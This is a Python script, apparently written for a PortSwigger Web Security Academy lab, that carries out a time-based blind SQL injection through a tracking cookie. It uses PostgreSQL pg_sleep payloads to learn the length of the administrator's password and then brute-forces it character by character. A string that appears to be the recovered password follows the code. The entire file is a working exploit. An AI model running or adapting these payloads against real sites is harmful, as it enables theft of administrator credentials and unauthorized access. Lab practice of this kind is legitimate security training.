import requests
import time

url="https://0a3000af0398e464802d1735004e0061.web-security-academy.net/login"
cookies= {
	'TrackingId' : '' ,
	'session' : 'UjTeGMl3bEVuMdbHOWPrMvfaO7HKcP5G'
}
headers={
	'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
}


#start=time.time()
#res=requests.get(url , cookies=cookies , headers=headers)
#end=time.time()
#delay=end-start



def Long(url , cookies , headers):
	i=0
	while True :
		i+=1
		payload="' || (SELECT CASE WHEN LENGTH(password)="+str(i)+"THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users where username='administrator') --"
		cookies['TrackingId']=payload
		res=requests.get(url , cookies=cookies , headers=headers)
		delay=res.elapsed.total_seconds()
		if delay >= 4  :
			print("Length Found --> "+str(i))
			break
		else : print("[Looking For Length ...]  ||  "+str(i))

#Long(url , cookies , headers)

def Brute(url , cookies , headers):
	c="abcdefghijklmnopqrstuvwxyz0123456789"
	pwd=""
	for i in range(1,21):
		for j in range(len(c)):
			payload="' || (SELECT CASE WHEN SUBSTR(password,"+str(i)+", 1)='"+c[j]+"' THEN pg_sleep(7) ELSE pg_sleep(0) END FROM users where username='administrator') --"
			cookies['TrackingId']=payload
			res=requests.get(url , cookies=cookies , headers=headers)
			delay = res.elapsed.total_seconds()
			print("[Brute Forcing Passowrd ...]  ||  "+pwd+c[j])
			if delay >= 7 :
				pwd+=c[j]
				break
	print("[Password Found :)]  ||  "+pwd)
Brute(url , cookies , headers)
vrbuwynvroaeaynuv4ty
